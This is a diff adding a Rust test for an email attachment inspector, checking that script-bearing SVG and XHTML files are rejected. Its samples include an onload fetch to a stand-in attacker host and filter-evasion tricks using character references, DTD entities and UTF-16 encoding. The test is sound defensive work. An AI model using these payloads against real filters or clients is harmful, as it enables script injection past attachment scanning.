@@ -406,3 +406,65 @@ async fn universal_mach_o_binaries_are_rejected() {
         }
     }
 }
+
+#[tokio::test]
+// TM-MAIL-01: browsers pick SVG/XHTML from the root namespace, not its spelling.
+async fn namespaced_svg_and_xhtml_roots_are_rejected_whatever_precedes_them() {
+    let strict = LocalAttachmentInspector::strict();
+    let opaque = LocalAttachmentInspector::allowing_opaque();
+    let svg_documents: [&[u8]; 7] = [
+        br#"<!DOCTYPE c><svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//evil.example/')"/>"#,
+        br#"<s:svg xmlns:s="http://www.w3.org/2000/svg" onload="x()"/>"#,
+        br#"<?xml version="1.0"?><s:svg xmlns:s="http://www.w3.org/2000/svg"/>"#,
+        br#"<?xml-stylesheet href="a.css"?><x:svg xmlns:x="http://www.w3.org/2000/svg"/>"#,
+        // Any root whose content is in the SVG namespace runs SVG script.
+        br#"<x xmlns:s="http://www.w3.org/2000/svg"><s:script>x()</s:script></x>"#,
+        // Character references can spell the namespace URI.
+        br#"<x xmlns:s="http://www.w3.org/2000/&#115;vg"><s:script>x()</s:script></x>"#,
+        // DTD entities can assemble it from pieces no substring check sees.
+        br#"<!DOCTYPE x [<!ENTITY a "http://www.w3.org/2000/"><!ENTITY b "s&#118;g">]><x xmlns:s="&a;&b;"/>"#,
+    ];
+    for inspector in [strict, opaque] {
+        for content in svg_documents {
+            let attachment = Attachment::new("chart.xml", content.to_vec(), "application/xml");
+            assert_eq!(
+                inspector.inspect(&attachment).await,
+                Err(AttachmentInspectionError::Rejected("active_svg_content")),
+                "{}",
+                String::from_utf8_lossy(content)
+            );
+        }
+        // A UTF-16 document is parsed by its byte-order mark.
+        let utf16: Vec<u8> = "\u{feff}<svg xmlns=\"http://www.w3.org/2000/svg\"/>"
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .collect();
+        let attachment = Attachment::new("chart", utf16, "application/octet-stream");
+        assert_eq!(
+            inspector.inspect(&attachment).await,
+            Err(AttachmentInspectionError::Rejected("active_svg_content"))
+        );
+    }
+    for content in [
+        br#"<h:html xmlns:h="http://www.w3.org/1999/xhtml"><h:script>x()</h:script></h:html>"#
+            .as_slice(),
+        br#"<!DOCTYPE x><x><s xmlns="http://www.w3.org/1999/xhtml">x</s></x>"#,
+        br#"<!-- a --><?pi?><h:body xmlns:h="urn:x"/>"#,
+    ] {
+        let attachment = Attachment::new("page.xml", content.to_vec(), "application/xml");
+        assert_eq!(
+            strict.inspect(&attachment).await,
+            Err(AttachmentInspectionError::Rejected("active_markup_content")),
+            "{}",
+            String::from_utf8_lossy(content)
+        );
+    }
+    // Ordinary XML documents, such as signed fiscal invoices, still pass.
+    let invoice = br#"<?xml version="1.0" encoding="UTF-8"?>
+<nfeProc xmlns="http://www.portalfiscal.inf.br/nfe" versao="4.00"><NFe><infNFe Id="NFe1"/>
+<Signature xmlns="http://www.w3.org/2000/09/xmldsig#"><SignedInfo/></Signature></NFe></nfeProc>"#;
+    for inspector in [strict, opaque] {
+        let attachment = Attachment::new("nfe.xml", invoice.to_vec(), "application/xml");
+        assert_eq!(inspector.inspect(&attachment).await, Ok(()));
+    }
+}
